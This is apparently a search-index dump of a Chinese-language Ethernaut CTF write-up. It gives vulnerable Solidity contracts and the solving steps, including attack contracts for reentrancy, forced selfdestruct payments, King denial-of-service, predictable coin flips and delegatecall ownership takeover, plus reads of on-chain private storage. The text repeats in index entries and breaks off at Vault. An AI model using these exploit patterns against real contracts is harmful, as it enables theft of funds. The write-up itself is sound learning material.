\u975e\u5e38\u7cdf\u5fc3\u7684\u662f\u6ca1\u6709\u627e\u5230\u8db3\u591f\u7684faucet\u83b7\u53d6\u8db3\u591f\u7684eth\u6765\u652f\u4ed8gas\uff0c\u6ca1\u60f3\u5230\u5c45\u7136\u5361\u5728\u4e86\u8fd9\u4e00\u6b65\u3002\u5728Goerli\u6269\u5c55\u7f51\u7edc\u4e0b\uff0c\u627e\u5230\u4e00\u4e2a \u6c34\u9f99\u5934 \uff0c\u6bcf\u5929\u53ef\u4ee5\u67090.005\uff0c\u867d\u7136\u5f88\u5c11\uff0c\u4f46\u662f\u5b58\u4e00\u5b58\u52c9\u5f3a\u591f\u7528\u3002\uff08GAS\u8d39\u597d\u8d35\uff0c\u90fd\u5feb0.01\u4e86\uff09 \u540e\u6765\u53d1\u73b0\u8fd9\u4e2a \u624b\u52a8\u6316 \uff0c\u76f4\u63a5\u6316\u4e86\u4e00\u4e9b\uff0c\u611f\u89c9\u8fd9\u6837\u8db3\u591f\u4e86\u3002 Hello Ethernaut \u00b6 \u8df3\u8fc7\u4e86\uff0c\u4e0d\u60f3\u6d6a\u8d39\u597d\u4e0d\u5bb9\u6613\u51d1\u7684Gas\u8d39\uff0c\u5c31\u662f\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u7684\u6559\u5b66\u3002 Fallback \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Fallback { mapping ( address => uint ) public contributions ; address public owner ; constructor () { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { payable ( owner ). transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u9898\u76ee\u8981\u6c42\uff0c\u6539\u53d8\u5408\u7ea6\u6240\u6709\u8005\u4e3a\u73a9\u5bb6\uff0c\u5e76\u53d6\u51fa\u6240\u6709\u7684\u4f59\u989d\u3002 \u6839\u636e\u5408\u7ea6\u4ee3\u7801\uff0c\u8981\u6c42\u73a9\u5bb6\u7684contribution\u503c\u5927\u4e8e\u539f\u5408\u7ea6\u62e5\u6709\u8005\u65f6\u79fb\u4ea4\u6240\u6709\u6743\uff0c\u4f46\u662f\u8fd9\u662f\u96be\u4ee5\u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u9700\u8981\u5229\u7528receive\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u5408\u7ea6\u63a5\u6536\u4ea4\u6613\u65f6\u5c31\u4f1a\u6267\u884c\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5148\u4f7f\u73a9\u5bb6contribution\u5927\u4e8e0\uff0c\u5e76\u5411\u5408\u7ea6\u53d1\u9001\u5927\u4e8e0\u7684\u4ea4\u6613\u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 await contract . contribute ({ value : 1 }) await contract . sendTransaction ({ value : 1 }) await contract . withdraw () Fallout \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Fallout { using SafeMath for uint256 ; mapping ( address => uint ) allocations ; address payable public owner ; /* constructor */ function Fal1out () public payable { owner = msg.sender ; allocations [ owner ] = msg.value ; } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function allocate () public payable { allocations [ msg.sender ] = allocations [ msg.sender ]. add ( msg.value ); } function sendAllocation ( address payable allocator ) public { require ( allocations [ allocator ] > 0 ); allocator . transfer ( allocations [ allocator ]); } function collectAllocations () public onlyOwner { msg.sender . transfer ( address ( this ). balance ); } function allocatorBalance ( address allocator ) public view returns ( uint ) { return allocations [ allocator ]; } } \u53ef\u4ee5\u53d1\u73b0\u5408\u7ea6\u7684constructor\u51fd\u6570\u662fFal1out\uff0c\u56e0\u6b64\u76f4\u63a5\u8c03\u7528 contract . Fal1out () \u5373\u53ef\u5b8c\u6210\u672c\u9898 Coinflip \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8fd9\u9053\u9898\u8ba9\u6211\u5b66\u4e60\u4e86\u5982\u4f55\u901a\u8fc7Remix\u90e8\u7f72\u5408\u7ea6\u5e76\u6267\u884c\u76f8\u5e94\u7684\u5408\u7ea6\u51fd\u6570\uff0c\u672c\u9898\u9700\u8981\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u56e0\u4e3a\u9898\u76ee\u5408\u7ea6\u4e2d\u8981\u6c42 lastHash != blockValue \uff0c\u5b89\u7167\u9898\u76ee\u8981\u6c42\u6267\u884c10\u6b21\u5373\u53ef\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; CoinFlip c = CoinFlip ( 0x2Ee20b7C14d2c7376F8E04cA175D840FF0644B85 ); function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; c . flip ( side ); } } Telephone \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u8fd9\u91cc\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u5c31\u662ftx.origin\u662f\u6574\u4e2a\u4ea4\u6613\u7684\u6700\u539f\u59cb\u53d1\u9001\u8005\uff0c\u800cmsg.sender\u5219\u662f\u5f53\u524d\u8c03\u7528\u8005\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u4e8e\u662f\uff0c\u53ea\u8981\u90e8\u7f72\u4e00\u4e2a\u5408\u7ea6\u6765\u8c03\u7528changeOwner\u65b9\u6cd5\u5373\u53ef\uff0c\u5408\u7ea6\u7f16\u5199\u5f88\u7b80\u5355\uff0c\u8fd9\u91cc\u5c31\u4e0d\u653e\u4e86\u3002 Token \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u8fd9\u91cc\u8003\u5bdf\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u662fuint\u6ea2\u51fa\uff0c\u6ea2\u51fa\u540e\u5c31\u80fd\u83b7\u5f97\u5f88\u5927\u7684\u6570\u503c\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 await contract . transfer ( contract . address , 21 ) \u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 Delegation \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Delegate { address public owner ; constructor ( address _owner ) { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u8fd9\u9053\u9898\u7684\u8003\u70b9\u662fdelegatecall\uff0c\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7684\u662f\u7ecf\u8fc7 abi . encodeWithSignature \u540e\u7684\u51fd\u6570\uff0c\u67e5\u8be2\u6587\u6863\u53ef\u77e5\u53ea\u8981\u53d6\u51fd\u6570\u540dsha3\u540e\u7684\u524d4\u4e2a\u5b57\u8282\u5373\u53ef\u3002 > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" }) Force \u00b6 \u867d\u7136\u65e0\u6cd5\u5411\u5408\u7ea6\u8f6c\u8d26\uff0c\u4f46\u662f\u5728\u5408\u7ea6\u81ea\u6bc1\u65f6\uff0c\u53ef\u4ee5\u5f3a\u5236\u5956\u4f59\u989d\u8f6c\u5230\u6307\u5b9a\u5730\u5740\uff0c\u56e0\u6b64\u53ea\u9700\u5148\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u5411\u5176\u8f6c\u8d26\u540e\uff0c\u518d\u81ea\u6bc1\u5408\u7ea6\u5373\u53ef\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } } Vault \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u7531\u4e8e\u533a\u5757\u94fe\u4e0a\u7684\u4e00\u5207\u90fd\u662f\u516c\u5f00\u7684\uff0c\u56e0\u6b64private\u53d8\u91cf\u4e5f\u662f\u53ef\u4ee5\u770b\u5230\u7684\uff0c\u4e0b\u9762\u5c31\u7528\u4e86Tony\u8001\u5e08\u7684\u89e3\u9898\u4ee3\u7801\u3002 > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb King \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5728\u66f4\u6362king\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4f59\u989d\u8f6c\u5230\u4e0a\u4e00\u4efbking\uff0c\u53ea\u8981\u9009\u62e9\u4e0d\u63a5\u53d7\uff0c\u5373\u53ef\u4e0d\u5b8c\u6210\u6362\u4efb\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528revert\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call { value : msg.value }( \"\" ); } fallback () external { revert (); } } \u53ea\u8981\u8f6c\u7684\u94b1\u6bd4prize(1300889614901161 wei)\u591a\u5c31\u53ef\u4ee5\u4e86\u3002 Re-entrancy \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u8fd9\u9898\u8003\u5bdf\u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3awithdraw\u662f\u5148\u8f6c\u8d26\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528receive\u6216fallback\u4e00\u76f4withdraw\u3002\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u540e\u6765\u53d1\u73b0\u662f\u6539\u4e86\u5408\u7ea6\u4ee3\u7801\u540e\u5fd8\u8bb0\u91cd\u65b0\u7f16\u8bd1\u4e86\uff0c\u6d6a\u8d39\u4e86\u597d\u591agas\u8d39qaq\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u6267\u884c\u5408\u7ea6\u524d\uff0c\u9700\u8981\u5148donate\u4fdd\u8bc1\u5408\u7ea6\u53ef\u4ee5\u53d6\u94b1\u3002 contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )}) Elevator \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u8fd9\u9898\u5b66\u4e60\u4e86solidity\u4e2d\u63a5\u53e3\u7684\u4e00\u4e9b\u7528\u6cd5\uff0c\u6839\u636e\u9898\u76ee\u8be6\u89e3\u4e5f\u4e86\u89e3\u5230\u4e86view\u548cpure\u51fd\u6570\u4fee\u6539\u5668\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u9632\u6b62\u72b6\u6001\u88ab\u7be1\u6539\uff0c\u4f46\u662f\u5373\u4f7f\u8fd9\u6837\uff0c\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u4e0d\u540c\u8f93\u5165\u5f97\u5230\u4e0d\u540c\u8f93\u51fa\u7684\u51fd\u6570\u89e3\u51fa\u672c\u9898\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } } Privacy \u00b6","title":"Ethernaut"},{"location":"ctf/writeups/ethernaut/#ethernaut","text":"Abstract \u611f\u89c9\u8fd9\u4e2a\u7cfb\u5217\u662fBlockchain\u6bd4\u8f83\u6709\u540d\u7684\u65b0\u624b\u9898\u76ee\u7cfb\u5217\uff0c\u5e0c\u671b\u80fd\u501f\u6b64\u5b66\u4f1a\u4e00\u4e9bBlockchain\u57fa\u7840\u6280\u80fd\uff0c\u4e0d\u81f3\u4e8e\u6bd4\u8d5b\u7684\u65f6\u5019\u65e0\u8111\u8df3\u8fc7\u3002 \u9898\u76ee\u94fe\u63a5 \u975e\u5e38\u7cdf\u5fc3\u7684\u662f\u6ca1\u6709\u627e\u5230\u8db3\u591f\u7684faucet\u83b7\u53d6\u8db3\u591f\u7684eth\u6765\u652f\u4ed8gas\uff0c\u6ca1\u60f3\u5230\u5c45\u7136\u5361\u5728\u4e86\u8fd9\u4e00\u6b65\u3002\u5728Goerli\u6269\u5c55\u7f51\u7edc\u4e0b\uff0c\u627e\u5230\u4e00\u4e2a \u6c34\u9f99\u5934 \uff0c\u6bcf\u5929\u53ef\u4ee5\u67090.005\uff0c\u867d\u7136\u5f88\u5c11\uff0c\u4f46\u662f\u5b58\u4e00\u5b58\u52c9\u5f3a\u591f\u7528\u3002\uff08GAS\u8d39\u597d\u8d35\uff0c\u90fd\u5feb0.01\u4e86\uff09 \u540e\u6765\u53d1\u73b0\u8fd9\u4e2a \u624b\u52a8\u6316 \uff0c\u76f4\u63a5\u6316\u4e86\u4e00\u4e9b\uff0c\u611f\u89c9\u8fd9\u6837\u8db3\u591f\u4e86\u3002","title":"Ethernaut"},{"location":"ctf/writeups/ethernaut/#hello-ethernaut","text":"\u8df3\u8fc7\u4e86\uff0c\u4e0d\u60f3\u6d6a\u8d39\u597d\u4e0d\u5bb9\u6613\u51d1\u7684Gas\u8d39\uff0c\u5c31\u662f\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u7684\u6559\u5b66\u3002","title":"Hello Ethernaut"},{"location":"ctf/writeups/ethernaut/#fallback","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Fallback { mapping ( address => uint ) public contributions ; address public owner ; constructor () { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { payable ( owner ). transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u9898\u76ee\u8981\u6c42\uff0c\u6539\u53d8\u5408\u7ea6\u6240\u6709\u8005\u4e3a\u73a9\u5bb6\uff0c\u5e76\u53d6\u51fa\u6240\u6709\u7684\u4f59\u989d\u3002 \u6839\u636e\u5408\u7ea6\u4ee3\u7801\uff0c\u8981\u6c42\u73a9\u5bb6\u7684contribution\u503c\u5927\u4e8e\u539f\u5408\u7ea6\u62e5\u6709\u8005\u65f6\u79fb\u4ea4\u6240\u6709\u6743\uff0c\u4f46\u662f\u8fd9\u662f\u96be\u4ee5\u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u9700\u8981\u5229\u7528receive\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u5408\u7ea6\u63a5\u6536\u4ea4\u6613\u65f6\u5c31\u4f1a\u6267\u884c\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5148\u4f7f\u73a9\u5bb6contribution\u5927\u4e8e0\uff0c\u5e76\u5411\u5408\u7ea6\u53d1\u9001\u5927\u4e8e0\u7684\u4ea4\u6613\u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 await contract . contribute ({ value : 1 }) await contract . sendTransaction ({ value : 1 }) await contract . withdraw ()","title":"Fallback"},{"location":"ctf/writeups/ethernaut/#fallout","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Fallout { using SafeMath for uint256 ; mapping ( address => uint ) allocations ; address payable public owner ; /* constructor */ function Fal1out () public payable { owner = msg.sender ; allocations [ owner ] = msg.value ; } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function allocate () public payable { allocations [ msg.sender ] = allocations [ msg.sender ]. add ( msg.value ); } function sendAllocation ( address payable allocator ) public { require ( allocations [ allocator ] > 0 ); allocator . transfer ( allocations [ allocator ]); } function collectAllocations () public onlyOwner { msg.sender . transfer ( address ( this ). balance ); } function allocatorBalance ( address allocator ) public view returns ( uint ) { return allocations [ allocator ]; } } \u53ef\u4ee5\u53d1\u73b0\u5408\u7ea6\u7684constructor\u51fd\u6570\u662fFal1out\uff0c\u56e0\u6b64\u76f4\u63a5\u8c03\u7528 contract . Fal1out () \u5373\u53ef\u5b8c\u6210\u672c\u9898","title":"Fallout"},{"location":"ctf/writeups/ethernaut/#coinflip","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8fd9\u9053\u9898\u8ba9\u6211\u5b66\u4e60\u4e86\u5982\u4f55\u901a\u8fc7Remix\u90e8\u7f72\u5408\u7ea6\u5e76\u6267\u884c\u76f8\u5e94\u7684\u5408\u7ea6\u51fd\u6570\uff0c\u672c\u9898\u9700\u8981\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u56e0\u4e3a\u9898\u76ee\u5408\u7ea6\u4e2d\u8981\u6c42 lastHash != blockValue \uff0c\u5b89\u7167\u9898\u76ee\u8981\u6c42\u6267\u884c10\u6b21\u5373\u53ef\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; CoinFlip c = CoinFlip ( 0x2Ee20b7C14d2c7376F8E04cA175D840FF0644B85 ); function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; c . flip ( side ); } }","title":"Coinflip"},{"location":"ctf/writeups/ethernaut/#telephone","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u8fd9\u91cc\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u5c31\u662ftx.origin\u662f\u6574\u4e2a\u4ea4\u6613\u7684\u6700\u539f\u59cb\u53d1\u9001\u8005\uff0c\u800cmsg.sender\u5219\u662f\u5f53\u524d\u8c03\u7528\u8005\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u4e8e\u662f\uff0c\u53ea\u8981\u90e8\u7f72\u4e00\u4e2a\u5408\u7ea6\u6765\u8c03\u7528changeOwner\u65b9\u6cd5\u5373\u53ef\uff0c\u5408\u7ea6\u7f16\u5199\u5f88\u7b80\u5355\uff0c\u8fd9\u91cc\u5c31\u4e0d\u653e\u4e86\u3002","title":"Telephone"},{"location":"ctf/writeups/ethernaut/#token","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u8fd9\u91cc\u8003\u5bdf\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u662fuint\u6ea2\u51fa\uff0c\u6ea2\u51fa\u540e\u5c31\u80fd\u83b7\u5f97\u5f88\u5927\u7684\u6570\u503c\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 await contract . transfer ( contract . address , 21 ) \u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002","title":"Token"},{"location":"ctf/writeups/ethernaut/#delegation","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Delegate { address public owner ; constructor ( address _owner ) { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u8fd9\u9053\u9898\u7684\u8003\u70b9\u662fdelegatecall\uff0c\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7684\u662f\u7ecf\u8fc7 abi . encodeWithSignature \u540e\u7684\u51fd\u6570\uff0c\u67e5\u8be2\u6587\u6863\u53ef\u77e5\u53ea\u8981\u53d6\u51fd\u6570\u540dsha3\u540e\u7684\u524d4\u4e2a\u5b57\u8282\u5373\u53ef\u3002 > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" })","title":"Delegation"},{"location":"ctf/writeups/ethernaut/#force","text":"\u867d\u7136\u65e0\u6cd5\u5411\u5408\u7ea6\u8f6c\u8d26\uff0c\u4f46\u662f\u5728\u5408\u7ea6\u81ea\u6bc1\u65f6\uff0c\u53ef\u4ee5\u5f3a\u5236\u5956\u4f59\u989d\u8f6c\u5230\u6307\u5b9a\u5730\u5740\uff0c\u56e0\u6b64\u53ea\u9700\u5148\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u5411\u5176\u8f6c\u8d26\u540e\uff0c\u518d\u81ea\u6bc1\u5408\u7ea6\u5373\u53ef\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } }","title":"Force"},{"location":"ctf/writeups/ethernaut/#vault","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u7531\u4e8e\u533a\u5757\u94fe\u4e0a\u7684\u4e00\u5207\u90fd\u662f\u516c\u5f00\u7684\uff0c\u56e0\u6b64private\u53d8\u91cf\u4e5f\u662f\u53ef\u4ee5\u770b\u5230\u7684\uff0c\u4e0b\u9762\u5c31\u7528\u4e86Tony\u8001\u5e08\u7684\u89e3\u9898\u4ee3\u7801\u3002 > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( 